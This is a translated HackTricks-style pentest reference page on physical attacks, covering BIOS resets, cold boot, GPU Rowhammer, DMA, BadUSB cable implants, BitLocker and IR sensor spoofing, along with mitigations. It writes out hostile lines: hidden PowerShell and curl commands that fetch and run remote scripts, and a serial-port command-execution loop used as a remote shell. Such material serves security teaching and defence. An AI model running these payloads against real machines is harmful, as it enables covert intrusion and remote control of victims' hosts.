# Fisiese aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherwinning en stelselsekuriteit

Instellings vir legacy PC-firmware kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde clear-CMOS-jumper te gebruik. Die vereiste tyd sonder krag hang van die moederbord af, en moderne UEFI-wagwoorde of -sleutels kan in nievlugtige flitsgeheue, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor wees en daarom ’n batteryverwydering oorleef. Raadpleeg die moederbord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyfenkripsieherstel aktiveer.

Op legacy x86-stelsels kan nutsprogramme soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing inspekteer of verander. CmosPwd herken wagwoordformate uit ’n gedokumenteerde stel ouer BIOS-families en kan die CMOS-toestand rugsteun, herstel of uitvee/vernietig; die gepubliseerde weergawes is bedoel vir legacy DOS/Windows-, Linux-, FreeBSD- en NetBSD-omgewings.<sup>[[18]](#references)</sup> Hierdie nutsprogramme is nie algemene verwyderaars van UEFI-wagwoorde nie en vereis voldoende toegang tot hardeware/firmware.

Sommige skootrekenaarfirmware wys ’n verskafferspesifieke uitdagingkode ná verskeie mislukte wagwoordpogings. Databasisse soos [bios-pw.org](https://bios-pw.org) kan vir sommige modelle legacy-herstelwagwoorde van verskaffers aflei, maar baie stelsels sluit toegang sonder ’n afleibare uitdaging. Behandel enige gegenereerde wagwoord as modelspefisiek en vermy dit om permanente pogingtellers uit te put.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskermings oudit. Begin met die nie-wysigende kontrole hieronder; die opsionele `-a modify`-modus probeer veranderlikes doelbewus beskadig en moet slegs op ’n laboratoriumstelsel gebruik word wat herstel kan word. CHIPSEC self waarsku dat sy bevoorregte drywer en laevlaktoegang tot hardeware nie geskik is vir produksie-eindpunte nie.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-ontleding en Cold Boot Attacks

DRAM verloor nie elke bis onmiddellik wanneer verversing stop nie. Die tempo van dataverval wissel aansienlik volgens moduultegnologie en temperatuur; verkoeling kan bruikbare data veel langer bewaar as ’n ongekoelde kragsiklus. ’n Cold-boot attack herlaai vinnig na ’n klein verkrygingsomgewing of dra ’n verkoelde module oor, neem rou geheue vas en rekonstrueer kriptografiese sleutels ondanks bisverval. ’n Skyfkopiehulpmiddel is nie outomaties ’n fisiesegeheue-afbeeldingshulpmiddel nie, en Volatility ontleed ’n opname eerder as om dit te verkry; gebruik ’n platformgeskikte, gevalideerde verkrygingshulpmiddel.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen bladsytafels

Moderne GPU Rowhammer-aanvalle word veel nuttiger wanneer hulle **GPU-virtuele-geheue-metadata** teiken in plaas van gewone buffers. Onlangse werk oor **GDDR6 NVIDIA Ampere-GPU's** toon dat ’n aanvaller wat CUDA-kode sonder verhoogde voorregte uitvoer, GPU-spesifieke hammering-patrone kan bou, **memory massaging** kan gebruik om pagineringstrukture in kwesbare rye te plaas, en dan bisse in die **laastevlak-bladsytafel** of ’n intermediêre **bladsygids** kan omkeer. Sodra ’n enkele vertalingsinskrywing beskadig is, kan die aanvaller **arbitrêre lees-/skryftoegang tot GPU-geheue** bewerkstellig en dan na ’n kompromittering van die gasheerstelsel oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Uitbuitingspatroon

1. **Profileer rye wat gehammer kan word** in GDDR6 en bou verversingsbewuste/n nie-eenvormige hammering-patrone wat in-DRAM-versagtings omseil.
2. **Manipuleer GPU-toekennings** sodat die drywer vertalingsstrukture vir bladsye in hammerbare fisiese liggings plaas, eerder as om dit in die verstek-beskermde poel te hou. In die praktyk kan dit beteken dat die laegeheue-bladsytafelgebied uitgeput word en groot, yl UVM-karterings met beheerde stapgroottes gesprinkel word.
3. **Keer vertalingsmetadata om**, soos **PFN**- of diafragma-verwante bisse binne ’n bladsytafel-/bladsygidsinskrywing, sodat die aanvallerbeheerde virtuele bladsy na bladsytafelbladsye, arbitrêre GPU-geheue of gasheersigbare stelselkarterings verwys.
4. Hergebruik die vervalste kartering om bykomende vertalingsinskrywings te herskryf en eskaleer na **arbitrêre lees-/skryftoegang tot GPU-geheue** oor GPU-kontekste heen.

### Skuif na gasheerstelsel en versagtings

- Wanneer **IOMMU gedeaktiveer is**, kan vervalste stelsel-diafragma-karterings arbitrêre **fisiese geheue van die gasheerstelsel** aan die GPU blootstel, wat die GPU-primitief in ’n volledige kompromittering van die gasheerstelsel omskep.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken laastevlak-bladsytafelinskrywings, terwyl **GeForge** toon dat die beskadiging van ’n bladsygidsvlak makliker kan wees omdat een bisomkering ’n groter vertaling-subboom kan herteiken. Moenie net een pagineringslaag as sekuriteitskritiek beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** is steeds belangrik omdat dit die direkte pad na arbitrêre gasheergeheue wat deur GDDRHammer/GeForge gebruik word, blokkeer, maar dit is **nie ’n volledige versagting nie**. **GPUBreach** toon ’n tweedefase-skuif waar die aanvaller GPU-skryfbare, drywereienaarskap-CPU-buffers beskadig en dan NVIDIA-drywergeheueveiligheidsfoute aktiveer om ’n kernskryfprimitief en ’n **root shell** te verkry, selfs met IOMMU geaktiveer.<sup>[[3]](#references)</sup>
- **Stelselvlak-ECC** is ’n praktiese versterkingsmaatreël op ondersteunde werkstasie-/bediener-GPU's. Verbruikers-GPU's sonder ECC bied ’n swakker verdedigingsoppervlak.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bisomkerings op ’n RTX 3060 en **202** op ’n RTX A6000 gerapporteer, wat genoeg was om ’n werkende ketting vir voorregte-eskalasie op die gasheerstelsel te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)-aanvalle

Vir vanlyn UEFI IFR/NVRAM-lapwerk wat IOMMU-afdwinging voor selflaai kan afgradeer en ’n Windows-DMA-ketting kan aktiveer, sien:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstreer **DMA-gebaseerde geheueverkryging en -lapwerk** oor koppelvlakke soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese aanmeldingsomseil-handtekeninge. Dit is nie bloot “oneffektief teen Windows 10” nie: uitbuitbaarheid hang af van die koppelvlak, teikenbou, IOMMU-beleid, sluittoestand en of Windows Kernel DMA Protection ondersteun en geaktiveer is. Windows 10 weergawe 1803 en later het Kernel DMA Protection op versoenbare platforms bekendgestel, wat die aanvalsoppervlak aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir stelseltoegang

Op ’n ongeënkripteerde of reeds ontsluite Windows-volume kan ’n vanlyn omgewing toeganklikheidsbinêre lêers soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat ’n SYSTEM-opdragprompt lewer wanneer die ooreenstemmende kortpad op die aanmeldskerm gebruik word. Gereedskap soos **chntpw** kan plaaslike SAM-rekeningdata wysig. Hierdie metodes omseil nie ’n geslote BitLocker-volume nie en kan geloofsbriewe wat deur DPAPI/EFS beskerm word, beskadig; bewaar forensiese kopieë en rugsteun.

**Kon-Boot** is ’n kommersiële hulpmiddel om verifikasie tydens selflaai te omseil op ondersteunde Windows-/macOS-konfigurasies. Verenigbaarheid hang af van die bedryfstelsel, firmwaremodus, Secure Boot en skyfenkripsie-opstelling; dit dekripteer nie ’n BitLocker-geslote volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows-sekuriteitskenmerke

### Selflaai- en herstelsneltoetse

- **Delete/Supr**, F2, F10 of ’n ander vervaardigersleutel kan firmware-opstelling oopmaak.
- **F8** open slegs Windows se gevorderde selflaai-opsies van die ouer generasie op konfigurasies waar dié pad steeds geaktiveer is; die huidige hersteltoegang wissel.
- Deur **Shift** in te hou, kan Windows se outomatiese aanmelding in sommige konfigurasies onderdruk word, hoewel beleid-/registerinstellings daardie gedrag kan deaktiveer.<sup>[[17]](#references)</sup>

### BAD USB-toestelle

Toestelle soos **USB Rubber Ducky** en Teensy-borde kan as vertroude HID-sleutelborde registreer en voorafbepaalde toetsaanslae invoer. Die payload het aanvanklik dieselfde voorregte en werkskermtoegang as die aangemelde sessie; UAC-aanwysings, skermsluiting, sleutelborduitleg, tydsberekening en USB-beleid by eindpunte plaas steeds beperkings daarop.<sup>[[15]](#references)</sup>

Programmeerbare randapparatuur kan ook gasheerkernontleders aanval en verskeie USB-toestelle koördineer vir heap grooming en inligtingopenbaarmaking:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administrateur- of rugsteunvoorregte kan gebruik word om ’n skadu-kopie te skep of registerkorwe te stoor sodat geslote lêers soos **SAM** en **SYSTEM** verkry kan word. Dit is ’n versamelingstegniek ná kompromittering, nie ’n voorregomseiling nie, en moet met `diskshadow`-/VSS- en registerkorf-uitvoer-gebeurtenisse gekorreleer word.

## BadUSB / HID-inplantingstegnieke

### NFC-geaktiveerde Android HID-gadget

’n Gewortelde Android-foon kan ’n programmeerbare USB-sleutelbord word slegs wanneer sy USB-beheerder en kern **USB-gadget/HID-ondersteuning** bied. Op versoenbare toestelle stel Kali NetHunter gadget-profiele deur **USB Arsenal** beskikbaar. ’n Ander opsie is [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), wat ConfigFS-gadgetfunksies skep en karaktertoestelle vir sleutelbord/muis soos `/dev/hidg0` en `/dev/hidg1` kan beskikbaar stel. Die hulpmiddel skep slegs die gadget-eindpunt; ’n afsonderlike proses moet HID-verslae daarheen skryf. Worteltoegang kan nie vergoed vir ’n kern sonder ConfigFS, HID-gadget-ondersteuning of ’n bruikbare USB-toestelbeheerder nie.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Hierdie eindpunt kan met Android NFC gekombineer word as ’n fisiese sneller. Die [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)-toepassing lees ’n merker-UID, omskep dit na die verwagte voorstelling, kontroleer ’n plaaslike witlys en stuur ’n gekonfigureerde Rubber Ducky-styl-sleutelbordvolgorde nadat ’n passing gevind is. Die gekoppelde gasheerstelsel sien gewone sleutelbordinvoer en benodig geen NFC-sagteware nie.<sup>[[22]](#references)[[24]](#references)</sup>

Valideer toestelregistrasie en sleutelborduitleg in ’n leë teksredigeerder voordat jy kortpaaie of opdragte gebruik. ’n Skadelose payload is:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Belangrike vertrouensgrense:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- ’n **UID-whitelist is identifikasie, nie verifikasie nie**. UID’s is publiek, en sommige token-tipes of emulators laat kloning of nabootsing toe. ’n Gekopieerde toegelate UID volg dieselfde verwerkingspad as die oorspronklike token.
- Die **NfcScreenOff** Magisk-module verander die NFC-diens sodat dit optree asof die skerm aan en ontsluit is. As die foon reeds aan ’n host gekoppel is, kan dit iemand in staat stel om die payload te aktiveer sonder om die foon te ontsluit.
- Wagwoorde, API-tokens en opdragte wat in die payload gestoor word, is herwinbare geheime op ’n gerootte toestel of ’n toestel met ’n ontsluite selflaaiprogram. Om ’n wagwoord oor HID in te tik, is outomatisering met ’n herbruikbare wagwoord, nie wagwoordlose verifikasie nie.
- HID-inspuiting gebruik die aktiewe lessenaar se regte en is afhanklik van fokus, tydsberekening en die host se sleutelborduitleg. Vereis onlangse gebruikerbevestiging voordat sensitiewe aksies uitgevoer word, vermy bevoorregte geheime in skrifte en gebruik ’n kriptografiese uitdaging-antwoord-verifikator vir werklike verifikasie.

### Wi-Fi-bestuurde kabelinplantings

- ESP32-S3-gebaseerde inplantings soos **Evil Crow Cable Wind** skuil binne USB-A→USB-C- of USB-C↔USB-C-kabels, verskyn uitsluitlik as ’n USB-sleutelbord en stel hul C2-stapel oor Wi-Fi beskikbaar. Die operateur hoef net die kabel van die slagoffer se host af van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en die wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te blaai om die ingebedde HTTP-koppelvlak te bereik.<sup>[[8]](#references)</sup>
- Die blaaier-UI bied oortjies vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoorde payloads word per bedryfstelsel gemerk, sleutelborduitlegte word intyds omgeskakel, en VID/PID-stringe kan verander word om bekende randapparatuur na te boots.
- Omdat die C2 binne die kabel is, kan ’n foon payloads gereedmaak, uitvoering aktiveer en Wi-Fi-eiebewyse bestuur sonder om die organisasie se netwerk te gebruik—nuttig vir fisiese indringings met ’n kort verblyftyd.

### Bedryfstelselbewuste AutoExec-payloads

- AutoExec-reëls koppel een of meer payloads sodat hulle onmiddellik ná USB-enumerasie uitgevoer word. Die inplanting doen liggewig-bedryfstelselvingerafdrukke en kies die ooreenstemmende skrif.
- Voorbeeldwerkvloei:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat uitvoering sonder toesig plaasvind, kan die blote omruil van ’n laaikabel “plug-and-pwn”-aanvanklike toegang in die konteks van die aangemelde gebruiker bewerkstellig.

### HID-geïnisieerde afgeleë shell oor Wi-Fi TCP

1. **Sleutelstelaanvang:** ’n Gestoorde payload maak ’n konsole oop en plak ’n lus wat alles uitvoer wat op die nuwe USB-reeksapparaat aankom. ’n Minimale Windows-variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python-script, Android APK of lessenaartoepassing) terug na die operator begin. Enige grepe wat in die TCP-sessie ingetik word, word na die seriële lus hierbo gestuur, wat afstandsuitvoering van opdragte moontlik maak, selfs op air-gapped gashere. Uitset is beperk, dus voer operators gewoonlik opdragte blindelings uit (rekeningkepping, bykomende nutsgoed gereedmaak, ens.).

### HTTP OTA-opdateringsoppervlak

- Die gedokumenteerde Evil Crow Cable Wind-koppelvlak stel ’n ongeverifieerde firmware-opdateringseindpunt by `/update` bloot:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Veldoperateurs kan kenmerke midde-in-’n-operasie hot-swap (bv. USB Army Knife-firmware flash) sonder om die kabel oop te maak, sodat die implant na nuwe vermoëns kan oorskakel terwyl dit steeds by die teikenhost ingeprop is.

## Om BitLocker-enkripsie te omseil

’n Gemagtigde forensiese verkryging van ’n stelsel wat aan is of onlangs geloop het, kan ’n BitLocker-volumehoofsleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële nutsprogramme soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan ondersteunde geheuebeelde, hibernasielêers of crash dumps deursoek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook crash dumps wanneer BitLocker geaktiveer is, en ’n gestoorde herstelwagwoord van 48 syfers is ’n ander artefak as ’n volumesleutel in die geheue.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering om ’n herstelsleutel by te voeg

’n Aanvaller wat ’n administrateur oorreed om BitLocker-bestuurbevele uit te voer, kan ’n herstelwagwoord-, eksterne-sleutel- of ander beskermer byvoeg en dit dan vaslê. ’n Herstelwagwoord kan nie ’n arbitrêre string nulle wees nie: BitLocker-numeriese herstelwagwoorde het ’n gevalideerde formaat van 48 syfers. Die relevante sintaksis vir gemagtigde administrasie is `manage-bde -protectors -add C: -recoverypassword`; lys die gevolglike beskermers met `manage-bde -protectors -get C:`. Monitor wanneer beskermers bygevoeg word en verseker dat nuwe herstelmateriaal slegs na goedgekeurde liggings geargiveer word.<sup>[[16]](#references)</sup>

---

## Ontginning van onderstel-indringing-/instandhoudingskakelaars om die BIOS na fabrieksinstellings terug te stel

Baie moderne skootrekenaars en kleinvormfaktor-rekenaars sluit ’n **onderstel-indringingskakelaar** in wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die skakelaar hoofsaaklik ’n waarskuwing moet aktiveer wanneer ’n toestel oopgemaak word, implementeer vervaardigers soms ’n **ongedokumenteerde herstelaanslag** wat geaktiveer word wanneer die skakelaar volgens ’n spesifieke patroon gewissel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die skakelaar is aan ’n **GPIO-onderbreking** op die EC bedraad.
2. Firmware wat op die EC loop, hou die **tydsberekening en aantal drukke** by.
3. Wanneer ’n hardgekodeerde patroon herken word, roep die EC ’n *mainboard-reset*-roetine aan wat **die inhoud van die stelsel se NVRAM/CMOS uitwis**.
4. Met die volgende selflaai laai die betrokke modelle die teruggestelde firmwaretoestand. Afhangend van die vervaardiger en hersiening kan die skoongemaakte toestand ’n toesighouerwagwoord, pasgemaakte selflaai-instellings of ingeskrewe Secure Boot-sleutels insluit; TPM-toestand en skyf-enkripsiegevolge moet afsonderlik beoordeel word.

> ’n Firmware-terugstelling kan opsies vir selflaai vanaf eksterne media herstel, maar dit **dekripteer nie berging nie**. BitLocker of ’n ander volledige-skyf-enkripsiestelsel kan ná TPM-/firmwareveranderinge in herstelmodus ingaan en steeds die interne skyf beskerm as daar nie ’n herstelsleutel is nie.<sup>[[16]](#references)</sup>

### Werklike voorbeeld – Framework 13-skootrekenaar

Die herstelaanslag vir die Framework 13 (11de/12de/13de generasie) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Ná die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM met die volgende herlaai uit te vee. Die hele prosedure neem ongeveer 40 s en vereis **niks behalwe ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Generiese uitbuitingsprosedure

1. Skakel die teiken aan of hervat dit uit slaapmodus sodat die EC loop.
2. Verwyder die onderste deksel om toegang tot die indringer-/onderhoudskakelaar te kry.
3. Herhaal die verskafferspesifieke skakelaarpatroon (raadpleeg dokumentasie of forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai dit; inspekteer dan watter firmware-instellings en geloofsbriewe werklik verander het.
5. Indien gemagtig en eksterne selflaai beskikbaar is, selflaai ’n beheerde live image. Sodra ’n interne volume wettiglik ontsluit is (of as dit nooit geënkripteer was nie), kan die live-omgewing geloofsbriewe en data bekom of die EFI System Partition inspekteer. Om daardie partisie te wysig om ’n EFI-implantaat te installeer, is permanent en hoogs indringend, en word steeds beperk deur Secure Boot, measured boot, firmware-skryfbeskerming en eindpuntmonitering. Geënkripteerde berging bly ontoeganklik sonder die sleutel of herstelmateriaal.

### Opsporing en versagting

* Teken onderstel-indringingsgebeurtenisse in die OS-bestuurskonsole aan en korreleer dit met onverwagte BIOS-terugstellings.
* Gebruik **peuterduidelike seëls** op skroewe/deksels om opening op te spoor.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat fisiese toegang gelykstaan aan ’n volledige kompromittering.
* Waar beskikbaar, deaktiveer die verskaffer se “maintenance switch reset”-funksie of vereis bykomende kriptografiese magtiging vir NVRAM-terugstellings.

---

## Verborge IR-inspuiting teen aanrakinglose uitgangsensors

### Sensoreienskappe
- Algemene “wave-to-exit”-sensors koppel ’n naby-IR-LED-sender aan ’n TV-afstandbeheeragtige ontvangermodule wat slegs ’n logiese hoë sein gee nadat dit verskeie pulse (~4–10) van die korrekte draer (≈30 kHz) ontvang het.<sup>[[7]](#references)</sup>
- ’n Plastiekomhulsel keer dat die sender en ontvanger direk na mekaar kyk, dus neem die beheerder aan dat enige gevalideerde draer van ’n nabygeleë weerkaatsing afkomstig is en aktiveer ’n aflos wat die deurgrendel oopmaak.
- Sodra die beheerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-omhulsel, maar die ontvanger aanvaar steeds enige sarsie wat by die gefiltreerde draer pas.

### Aanvalwerkvloei
1. **Neem die emissieprofiel vas** – koppel ’n logika-ontleder oor die beheerderpenne om beide die golfvorms voor en ná opsporing op te neem wat die interne IR-LED aandryf.
2. **Herhaal slegs die “ná-opsporing”-golfvorm** – verwyder/ignoreer die oorspronklike sender en dryf ’n eksterne IR-LED met die patroon wat reeds geaktiveer is. Omdat die ontvanger net omgee vir die pulstelling/-frekwensie, beskou dit die vervalste draer as ’n egte weerkaatsing en aktiveer dit die afloslyn.
3. **Beheer die uitsending** – stuur die draer in ingestelde sarsies uit (bv. tien millisekondes aan, ongeveer dieselfde tyd af) om die minimum pulstelling te lewer sonder om die ontvanger se AGC of steuringshanteringslogika te oorlaai. Deurlopende uitsending maak die sensor vinnig minder sensitief en keer dat die aflos aktiveer.

### Langafstand-reflektiewe inspuiting
- Deur die werkbank-LED met ’n hoëkrag-IR-diode, MOSFET-drywer en fokusoptika te vervang, kan die sensor betroubaar van ongeveer 6 m afstand geaktiveer word.
- Die aanvaller het nie ’n direkte siglyn na die ontvangeropening nodig nie; deur die straal op binnemure, rakke of deurkosyne te rig wat deur glas sigbaar is, kan weerkaatste energie die gesigsveld van ongeveer 30° binnedring en ’n handwaai van naby naboots.
- Omdat die ontvangers slegs swak weerkaatsings verwag, kan ’n veel sterker eksterne straal van verskeie oppervlaktes weerkaats en steeds bo die opsporingsdrempel bly.

### Gewapende aanval-flitslig
- Deur die drywer binne ’n kommersiële flitslig in te bou, word die instrument in die sigbare omgewing versteek. Vervang die sigbare LED met ’n hoëkrag-IR-LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-sarsies te genereer, en gebruik ’n MOSFET om die LED-stroom af te voer.
- ’n Uittrekbare zoomlens vernou die straal vir reikafstand/akkuraatheid, terwyl ’n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulasie aktief is sonder om sigbare lig uit te stuur.
- Deur verskeie gestoorde modulasiepatrone (effens verskillende draerfrekwensies en omhulsels) te deurloop, verbeter versoenbaarheid met heretiketteerde sensorfamilies. Die operateur kan weerkaatsende oppervlaktes skandeer totdat die aflos hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: DRAM-rye grootliks versteur — Rowhammer-aanvalle oor komponente heen vanaf moderne GPU’s](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-geheue aanhamer om GPU-bladsytabelle vir pret en wins te vervals](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilegie-eskalasie-aanvalle op GPU’s met Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sekuriteitskennisgewing: Rowhammer - Julie 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om te pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir moederbordterugstelling](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Neeeee, raak nie! – Om IR-aanrakinglose uitgangsensors met ’n verborge IR-flitslig te omseil”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Koppel in, speel, pwn: Inbraak met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-aanval teen NVIDIA-skyfies](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot se amptelike dokumentasie en versoenbaarheidsinligting](https://kon-boot.com/)
- [11] [CHIPSEC-dokumentasie - Secure Boot-veranderlikebeskerming](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Laat ons nie vergeet nie: Koue-selflaai-aanvalle op enkripsiesleutels](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Fisiese geheuemanipulasie oor DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky-dokumentasie](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker-bedryfsgids](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift inhou en outomatiese aanmeldgedrag](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-dokumentasie en aflaaie](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux-dokumentasie - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-kerneldokumentasie - USB HID-gadgetdrywer](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-na-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Verander ’n Android-foon met root-toegang in ’n NFC-outentiseerder en outomatiseringsinstrument vir jou rekenaar](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
